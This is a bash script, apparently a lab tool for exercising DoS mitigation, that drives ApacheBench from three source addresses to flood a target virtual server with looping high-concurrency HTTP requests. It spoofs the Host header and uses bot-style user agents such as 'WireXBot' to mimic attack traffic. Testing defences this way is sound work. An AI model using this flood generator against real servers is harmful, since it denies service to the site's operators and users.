#!/bin/bash

# dos_attack.sh
#
# Purpose:
# Launch repeatable ApacheBench-based traffic profiles to simulate attack
# patterns against a target virtual server.
#
# Prerequisites:
# - ApacheBench (ab) must be installed and available in PATH.
# - Source and destination addresses below must be reachable on this host.
#
# Configuration:
# - VS_ADDR: target virtual server address.
# - SRC_ADDR1, SRC_ADDR2, SRC_ADDR3: source interface/IP addresses used to
#   generate traffic.
#
# Usage:
# 1. Run: ./dos_attack.sh
# 2. Select a menu option:
#    - Attack start - similarity: starts a mixed user-agent profile to mimic
#      similarity-based attack traffic.
#    - Attack start - score: starts a score-focused profile with repeated
#      WireXBot-style requests and static asset access.
#    - Attack end: stops current attack workers started by this script.
#    - Quit: stops workers and exits.
# 3. Press Ctrl-C at any time to stop active workers and return control.
#

#PLEASE REPLACE ADDRESSES######
VS_ADDR=192.168.57.82
SRC_ADDR1=192.168.57.12
SRC_ADDR2=192.168.57.13
SRC_ADDR3=192.168.57.14
###############################

stop_flag=0
child_pids=()

require_binary() {
	if ! command -v "$1" >/dev/null 2>&1; then
		echo "Missing dependency: $1"
		exit 1
	fi
}

is_valid_ipv4() {
	local ip="$1"
	local IFS=.
	local octets

	[[ "$ip" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]] || return 1
	read -r -a octets <<< "$ip"
	for octet in "${octets[@]}"; do
		((octet >= 0 && octet <= 255)) || return 1
	done
	return 0
}

validate_addresses() {
	local addr
	for addr in "$VS_ADDR" "$SRC_ADDR1" "$SRC_ADDR2" "$SRC_ADDR3"; do
		if ! is_valid_ipv4 "$addr"; then
			echo "Invalid IPv4 address: $addr"
			exit 1
		fi
	done
}

cleanup_attack() {
	local pid
	for pid in "${child_pids[@]}"; do
		if kill -0 "$pid" 2>/dev/null; then
			kill "$pid" 2>/dev/null
			wait "$pid" 2>/dev/null
		fi
	done
	child_pids=()
}

wait_for_children() {
	local pid
	for pid in "${child_pids[@]}"; do
		wait "$pid" 2>/dev/null
	done
	child_pids=()
}

start_ab() {
	local src_addr="$1"
	local target_url="$2"
	local user_agent="$3"
	local referer="$4"
	local include_pragma="$5"
	local timeout_secs="$6"
	local cmd

	cmd=(ab -B "$src_addr" -l -r -n 1000000 -c 500 -d)
	if [[ -n "$timeout_secs" ]]; then
		cmd+=(-s "$timeout_secs")
	fi

	cmd+=(-H "Host: avalanchecorp.net")
	if [[ "$include_pragma" == "yes" ]]; then
		cmd+=(-H "Pragma: no-cache")
	fi

	cmd+=(
		-H "Cache-Control: no-cache"
		-H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
		-H "Upgrade-Insecure-Requests: 1"
		-H "User-Agent: $user_agent"
		-H "x-requested-with:"
	)

	if [[ -n "$referer" ]]; then
		cmd+=(-H "Referer: $referer")
	fi

	cmd+=(
		-H "Accept-Encoding: gzip, deflate"
		-H "Accept-Language: en-US"
		"$target_url"
	)

	"${cmd[@]}" &
	child_pids+=("$!")
}

start_similarity_attack() {
	echo "Start attack"
	stop_flag=0

	while [[ "$stop_flag" -eq 0 ]]; do
		start_ab "$SRC_ADDR1" "http://${VS_ADDR}/" "eVil-sVen" "http://10.0.2.1/none.html" "yes" ""
		start_ab "$SRC_ADDR2" "http://${VS_ADDR}/" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)" "http://10.0.2.1/none.html" "yes" ""
		start_ab "$SRC_ADDR3" "http://${VS_ADDR}/" "WireXBot" "http://10.0.2.1/none.html" "yes" "10"

		wait_for_children
	done
}

start_score_attack() {
	echo "Start attack"
	stop_flag=0

	while [[ "$stop_flag" -eq 0 ]]; do
		start_ab "$SRC_ADDR1" "http://${VS_ADDR}/" "WireXBot" "http://10.0.2.1/none.html" "yes" ""
		start_ab "$SRC_ADDR2" "http://${VS_ADDR}/assets/bootstrap-solid.svg" "WireXBot" "" "no" ""
		start_ab "$SRC_ADDR3" "http://${VS_ADDR}/" "WireXBot" "http://10.0.2.2/none.html" "yes" "10"

		wait_for_children
	done
}

ctrl_c() {
	echo "** Trapped CTRL-C"
	stop_flag=1
	cleanup_attack
}

require_binary ab
validate_addresses

# trap ctrl-c and call ctrl_c()
trap ctrl_c INT TERM

PS5='Please enter your choice: '
options=("Attack start - similarity" "Attack start - score"  "Attack end" "Quit")
select opt in "${options[@]}"
do
	case $opt in
		"Attack start - similarity")
			start_similarity_attack
			;;
		"Attack start - score")
			start_score_attack
			;;
		"Attack end")
			echo "Terminate attack"
			stop_flag=1
			cleanup_attack
			;;
		"Quit")
			stop_flag=1
			cleanup_attack
			break
			;;
		*)
			echo invalid option
			;;
	esac
done

